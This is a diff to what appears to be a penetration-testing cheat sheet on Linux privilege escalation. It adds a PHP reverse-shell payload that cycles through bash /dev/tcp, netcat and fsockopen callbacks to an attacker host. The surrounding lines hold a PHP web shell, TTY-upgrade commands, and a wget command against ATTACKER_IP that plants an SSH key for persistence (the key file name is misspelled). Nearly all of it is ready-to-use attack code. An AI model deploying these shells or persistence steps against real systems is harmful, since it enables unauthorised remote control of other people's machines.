@@ -1,8 +1,33 @@
 *Linux elevation of privileges*narrative
 
 Shells
-    Php
+    PHP
     *<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>*
+    PHP reverse shell filter bypassing:
+    *<?php
+echo 'running shell';
+$ip='attacker ip';
+$port='attacker port';
+$a='/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1';
+$b='0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; sh <&196 >&196 2>&196';
+$c='nc '.$ip.' '.$port.' -e /bin/bash';
+$d='nc.exe -nv '.$ip.' '.$port.' -e cmd.exe';
+try {echo system($a);} catch (Exception $e) {echo $e;}
+try {echo system($b);} catch (Exception $e) {echo $e;}
+try {echo system($c);} catch (Exception $e) {echo $e;}
+try {echo system($d);} catch (Exception $e) {echo $e;}
+try {shell_exec($a);} catch (Exception $e) {echo $e;}
+try {shell_exec($b);} catch (Exception $e) {echo $e;}
+try {shell_exec($c);} catch (Exception $e) {echo $e;}
+try {shell_exec($d);} catch (Exception $e) {echo $e;}
+try {exec($a);} catch (Exception $e) {echo $e;}
+try {exec($b);} catch (Exception $e) {echo $e;}
+try {exec($c);} catch (Exception $e) {echo $e;}
+try {exec($d);} catch (Exception $e) {echo $e;}
+$sock=fsockopen($ip,$port);exec("/bin/sh -i <&3 >&3 2>&3");
+?>*
+    Kali reverse php shell:
+    */usr/share/webshells/php/php-reverse-shell.php*
 
 Reverse shells
     Using netcat
@@ -32,7 +57,11 @@ p=subprocess.call(["/bin/sh","-i"])*
 Post exploitation
     Get a TTY shell after a reverse shell connection
     *$ python -c 'import pty;pty.spawn("/bin/bash")'*
-    Add public key to authorized keys:
+Set PATH TERM and SHELL if missing:
+    *$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+export SHELL=bash*
+ Add public key to authorized keys:
     *$ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authotized_keys*
 
 
